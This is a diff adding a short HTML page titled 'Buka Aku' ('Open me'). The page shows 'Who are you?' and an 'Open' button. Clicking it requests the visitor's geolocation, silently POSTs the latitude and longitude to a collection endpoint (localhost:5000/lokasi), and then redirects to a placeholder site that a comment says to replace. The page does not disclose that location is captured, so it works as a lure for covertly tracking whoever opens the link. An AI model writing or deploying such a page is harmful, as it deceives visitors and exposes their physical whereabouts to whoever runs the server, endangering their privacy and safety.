@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Buka Aku</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #000;
+      color: white;
+      font-family: sans-serif;
+      flex-direction: column;
+    }
+    button {
+      padding: 1em 2em;
+      font-size: 1.2em;
+      background-color: crimson;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>Who are you?</h1>
+  <button onclick="getLocation()">Open</button>
+
+  <script>
+    function getLocation() {
+      navigator.geolocation.getCurrentPosition(
+        function(pos) {
+          fetch("http://localhost:5000/lokasi", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude
+            })
+          })
+          .then(() => {
+            window.location.href = "https://example.com"; // ganti dengan halaman redirect
+          });
+        },
+        function(err) {
+          alert("Lokasi gagal diambil.");
+        }
+      );
+    }
+  </script>
+</body>
+</html>
